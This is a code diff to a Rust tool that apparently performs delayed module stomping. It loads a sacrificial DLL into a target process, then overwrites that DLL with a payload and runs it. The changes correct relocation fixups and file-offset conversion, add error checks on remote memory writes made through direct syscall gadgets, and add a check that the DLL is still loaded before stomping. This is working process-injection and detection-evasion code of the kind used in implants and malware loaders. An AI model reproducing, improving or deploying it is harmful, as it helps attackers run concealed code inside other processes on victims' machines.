@@ -156,6 +156,70 @@ const IMAGE_REL_BASED_HIGHLOW: u16 = 3;
 /// IMAGE_SCN_MEM_EXECUTE
 const IMAGE_SCN_MEM_EXECUTE: u32 = 0x20000000;
 
+// ── RVA ↔ file-offset conversion ────────────────────────────────────────────
+
+/// Convert a PE Relative Virtual Address to a raw file offset in `payload`.
+///
+/// Walks the section table: if `rva` falls inside a section's
+/// `[VirtualAddress .. VirtualAddress + VirtualSize)`, the corresponding
+/// file offset is `rva - VirtualAddress + PointerToRawData`.
+///
+/// Falls back to returning `rva` unchanged when the payload is too small
+/// to parse or the RVA lies in the PE header area (headers map 1:1).
+fn rva_to_file_offset(payload: &[u8], rva: usize) -> usize {
+    if payload.len() < 0x40 || payload[0] != b'M' || payload[1] != b'Z' {
+        return rva;
+    }
+    let e_lfanew = match (payload.len() > 0x3c).then(|| {
+        u32::from_le_bytes([payload[0x3c], payload[0x3d], payload[0x3e], payload[0x3f]]) as usize
+    }) {
+        Some(v) => v,
+        None => return rva,
+    };
+    if e_lfanew + 4 + std::mem::size_of::<ImageFileHeader>() > payload.len() {
+        return rva;
+    }
+    // Read NumberOfSections and SizeOfOptionalHeader from the file header.
+    let num_sections = u16::from_le_bytes(
+        payload[e_lfanew + 6..e_lfanew + 8]
+            .try_into()
+            .unwrap_or([0, 0]),
+    );
+    let size_of_opt_header = u16::from_le_bytes(
+        payload[e_lfanew + 20..e_lfanew + 22]
+            .try_into()
+            .unwrap_or([0, 0]),
+    ) as usize;
+    let sections_offset =
+        e_lfanew + 4 + std::mem::size_of::<ImageFileHeader>() + size_of_opt_header;
+
+    let section_hdr_size = std::mem::size_of::<ImageSectionHeader>();
+    for i in 0..num_sections as usize {
+        let off = sections_offset + i * section_hdr_size;
+        if off + section_hdr_size > payload.len() {
+            break;
+        }
+        // ImageSectionHeader layout (offsets from `off`):
+        //   +0  name[8]
+        //   +8  Misc.VirtualSize    (u32)
+        //   +12 VirtualAddress      (u32)
+        //   +16 SizeOfRawData       (u32)
+        //   +20 PointerToRawData    (u32)
+        let va =
+            u32::from_le_bytes(payload[off + 12..off + 16].try_into().unwrap_or([0, 0])) as usize;
+        let vs =
+            u32::from_le_bytes(payload[off + 8..off + 12].try_into().unwrap_or([0, 0])) as usize;
+        let raw =
+            u32::from_le_bytes(payload[off + 20..off + 24].try_into().unwrap_or([0, 0])) as usize;
+
+        if va != 0 && vs != 0 && rva >= va && rva < va + vs {
+            return rva - va + raw;
+        }
+    }
+    // Header area (rva < SizeOfHeaders) maps 1:1.
+    rva
+}
+
 // ── Types ────────────────────────────────────────────────────────────────────
 
 /// Persistent state for a pending delayed stomp operation.
@@ -921,10 +985,24 @@ unsafe fn fix_relocations(
         return Ok(nt.optional_header.address_of_entry_point);
     }
 
-    // Read relocation blocks from remote memory (the PE headers may have been
-    // stomped already, so we read from the original payload buffer)
+    // Read relocation blocks from the local payload buffer (the PE headers
+    // in the remote process may have been stomped already).
+    //
+    // IMPORTANT: The relocation directory's VirtualAddress is an RVA, but
+    // we are indexing into the raw file bytes of `payload`.  When a
+    // section's VirtualAddress differs from its PointerToRawData (i.e.
+    // section alignment != file alignment), we must convert the RVA to a
+    // file offset before indexing.  The remote writes below (dll_base +
+    // block_va + rva_offset) are correct as-is because the remote PE is
+    // memory-mapped and RVAs ARE the correct offsets there.
     let reloc_rva = reloc_dir.virtual_address as usize;
     let reloc_size = reloc_dir.size as usize;
+    let reloc_file_off = rva_to_file_offset(payload, reloc_rva);
+    let reloc_end = reloc_file_off.saturating_add(reloc_size);
+    if reloc_end > payload.len() {
+        // Relocation data extends beyond the file — cannot safely fixup.
+        return Ok(nt.optional_header.address_of_entry_point);
+    }
     let mut offset = 0;
 
     // We need to apply relocations via NtWriteVirtualMemory to the target.
@@ -936,16 +1014,16 @@ unsafe fn fix_relocations(
 
     while offset + 8 < reloc_size {
         let block_va = u32::from_le_bytes([
-            payload[reloc_rva + offset],
-            payload[reloc_rva + offset + 1],
-            payload[reloc_rva + offset + 2],
-            payload[reloc_rva + offset + 3],
+            payload[reloc_file_off + offset],
+            payload[reloc_file_off + offset + 1],
+            payload[reloc_file_off + offset + 2],
+            payload[reloc_file_off + offset + 3],
         ]) as usize;
         let block_size = u32::from_le_bytes([
-            payload[reloc_rva + offset + 4],
-            payload[reloc_rva + offset + 5],
-            payload[reloc_rva + offset + 6],
-            payload[reloc_rva + offset + 7],
+            payload[reloc_file_off + offset + 4],
+            payload[reloc_file_off + offset + 5],
+            payload[reloc_file_off + offset + 6],
+            payload[reloc_file_off + offset + 7],
         ]) as usize;
 
         if block_size == 0 {
@@ -957,7 +1035,7 @@ unsafe fn fix_relocations(
         }
         let num_entries = (block_size - 8) / 2;
         for i in 0..num_entries {
-            let entry_offset = reloc_rva + offset + 8 + i * 2;
+            let entry_offset = reloc_file_off + offset + 8 + i * 2;
             if entry_offset + 2 > payload.len() {
                 break;
             }
@@ -971,9 +1049,9 @@ unsafe fn fix_relocations(
                     let target_addr = dll_base + block_va + rva_offset;
                     let mut val: u64 = 0;
                     read_remote_memory(process_handle, target_addr, &mut val)?;
-                    val = (val as i64 + delta as i64) as u64;
+                    val = val.wrapping_add(delta as u64);
                     let mut bytes_written: usize = 0;
-                    let _ = do_syscall(
+                    let status = do_syscall(
                         write_tgt.ssn,
                         write_tgt.gadget_addr,
                         &[
@@ -984,15 +1062,23 @@ unsafe fn fix_relocations(
                             &mut bytes_written as *mut usize as u64,
                         ],
                     );
+                    if status < 0 {
+                        anyhow::bail!(
+                            "DIR64 relocation write failed at {:#x} (status {:#x})",
+                            target_addr,
+                            status as u32
+                        );
+                    }
                 }
                 IMAGE_REL_BASED_HIGHLOW => {
-                    // 32-bit relocation
+                    // 32-bit relocation — use wrapping_add to handle
+                    // deltas > 2 GB without signed-cast overflow (MED-001).
                     let target_addr = dll_base + block_va + rva_offset;
                     let mut val: u32 = 0;
                     read_remote_memory(process_handle, target_addr, &mut val)?;
-                    val = (val as i32 + delta as i32) as u32;
+                    val = val.wrapping_add(delta as u32);
                     let mut bytes_written: usize = 0;
-                    let _ = do_syscall(
+                    let status = do_syscall(
                         write_tgt.ssn,
                         write_tgt.gadget_addr,
                         &[
@@ -1003,6 +1089,13 @@ unsafe fn fix_relocations(
                             &mut bytes_written as *mut usize as u64,
                         ],
                     );
+                    if status < 0 {
+                        anyhow::bail!(
+                            "HIGHLOW relocation write failed at {:#x} (status {:#x})",
+                            target_addr,
+                            status as u32
+                        );
+                    }
                 }
                 _ => {} // Skip other types (ABSOLUTE, etc.)
             }
@@ -1212,6 +1305,47 @@ pub unsafe fn phase1_load(
 /// This is called after the delay has elapsed.
 pub unsafe fn phase2_stomp_and_execute(mut pending: PendingStomp) -> Result<InjectionHandle> {
     let process_handle = pending.process_handle as *mut c_void;
+
+    // ── DLL liveness check (MED-008) ──────────────────────────────────────
+    // Between Phase 1 (load sacrificial DLL) and Phase 2 (stomp + execute),
+    // the target process may have unloaded or relocated the DLL.  Re-enumerate
+    // the module list and verify the DLL is still present at the recorded base.
+    match enumerate_remote_modules(process_handle) {
+        Ok(modules) => {
+            let dll_lower = pending.dll_name.to_ascii_lowercase();
+            let found = modules.iter().find(|m| {
+                m.name.to_ascii_lowercase().ends_with(&dll_lower) && m.base == pending.dll_base
+            });
+            if found.is_none() {
+                tracing::error!(
+                    "[delayed-stomp] DLL liveness check FAILED: {} is no longer loaded at {:#x} \
+                     (may have been unloaded or relocated since Phase 1)",
+                    pending.dll_name,
+                    pending.dll_base
+                );
+                // Re-close the process handle via the PendingStomp drop before returning error.
+                pending.process_handle = 0;
+                return Err(anyhow::anyhow!(
+                    "sacrificial DLL '{}' no longer loaded at {:#x} — aborting stomp",
+                    pending.dll_name,
+                    pending.dll_base
+                ));
+            }
+            tracing::info!(
+                "[delayed-stomp] DLL liveness check passed: {} still at {:#x}",
+                pending.dll_name,
+                pending.dll_base
+            );
+        }
+        Err(e) => {
+            tracing::warn!(
+                "[delayed-stomp] Could not enumerate remote modules for liveness check: {} \
+                 — proceeding (best-effort)",
+                e
+            );
+        }
+    }
+
     // Transfer ownership of the process handle to InjectionHandle.
     // Zero it here so PendingStomp::drop does not double-close.
     pending.process_handle = 0;
